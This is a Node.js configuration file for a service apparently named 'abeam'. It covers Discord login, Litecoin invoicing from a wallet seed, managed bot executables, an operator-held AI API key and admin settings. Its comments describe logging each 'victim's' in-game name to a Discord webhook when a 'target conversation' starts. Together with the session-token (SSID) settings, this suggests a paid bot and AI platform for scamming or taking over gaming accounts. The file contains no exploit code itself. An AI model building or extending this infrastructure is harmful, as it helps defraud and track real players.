import dotenv from 'dotenv';
dotenv.config();

const port = Number(process.env.PORT || 8080);

export const config = {
  env: process.env.NODE_ENV || 'development',
  port,
  appUrl: (process.env.APP_URL || `http://localhost:${port}`).replace(/\/$/, ''),

  // Discord OAuth (website login).
  discordClientId: process.env.DISCORD_CLIENT_ID || '',
  discordClientSecret: process.env.DISCORD_CLIENT_SECRET || '',
  sessionSecret: process.env.SESSION_SECRET || 'insecure-dev-secret',

  // LTC billing
  // BIP44 LTC HD seed (m/44'/2'/...). 24-word BIP39 phrase is recommended.
  ltcSeed: process.env.LTC_SEED || '',
  // Free BlockCypher token (or empty to rely on manual admin fallback).
  blockcypherToken: process.env.BLOCKCYPHER_TOKEN || '',
  // Approx USD per LTC — adjusts invoice amounts. Confirmations to grant.
  ltcUsdRate: Number(process.env.LTC_USD_RATE || 60),
  confirmationsRequired: Number(process.env.LTC_CONFIRMATIONS || 0),
  ltcNetwork: (process.env.LTC_NETWORK || 'main').toLowerCase(),

  // Pending invoices auto-cancel after this long; late payments still land
  // within the grace window (fail-safe so nobody's funds get stranded).
  invoiceTtlMs: Number(process.env.INVOICE_TTL_HOURS || 48) * 3_600_000,
  invoiceGraceMs: Number(process.env.INVOICE_GRACE_HOURS || 24) * 3_600_000,

  // Fully-managed cloud bots (VPS). abeam.exe path + poll cadence.
  botExe: process.env.BOT_EXE || '', // legacy managed executable for the /api/slots API
  backendWsUrl: process.env.BACKEND_WS_URL || `ws://127.0.0.1:${port}/ws/bot`,
  supervisorPollMs: Number(process.env.SUPERVISOR_POLL_MS || 5000),
  // Self-contained /api/bots connections (bots/manager.js).
  botConnectionTimeoutMs: Number(process.env.BOT_CONNECTION_TIMEOUT_MS || 45_000),

  // Beam AI: the operator holds the central API key; members only spend credits.
  aiKey: (process.env.AI_API_KEY || '').trim(),

  // Owner wallet: network fee paid per swept/sent byte (satoshis per kb).
  walletFeeSatsPerKb: Number(process.env.WALLET_FEE_SATS_PER_KB || 1500),

  // Ops/admin
  adminToken: process.env.ADMIN_TOKEN || '',
  // Emails allowed to see the Admin panel in the dashboard (comma-separated).
  // In development, the demo/operator account counts as admin so you can test.
  adminEmails: (() => {
    const list = (process.env.ADMIN_EMAILS || '')
      .split(',')
      .map((s) => s.trim().toLowerCase())
      .filter(Boolean);
    if (!list.length && process.env.NODE_ENV !== 'production' && process.env.DEMO_EMAIL) {
      list.push(String(process.env.DEMO_EMAIL).toLowerCase());
    }
    return list;
  })(),
  // Discord user IDs that count as admins (comma-separated).
  adminDiscordIds: (() =>
    (process.env.ADMIN_DISCORD_IDS || '')
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean).map(String))(),

  // Beam logging: when a target conversation ("match") starts, post a Discord
  // webhook with the victim's IGN + skin head. Empty disables.
  webhookUrl: process.env.WEBHOOK_URL || '',

  // Devlog: posts build/launch milestones to a Discord webhook. Empty disables.
  devlogWebhookUrl: process.env.DEVLOG_WEBHOOK_URL || '',

  // Demo access is only enabled in development (never in production).
  demoSsid: process.env.DEMO_SSID || 'abeam-demo-token',
  demoEmail: process.env.DEMO_EMAIL || 'you@example.com',
  // Allow a demo/passing SSID even without a paid plan (dev only).
  allowDemo: process.env.ALLOW_DEMO === 'true' && process.env.NODE_ENV !== 'production',
};
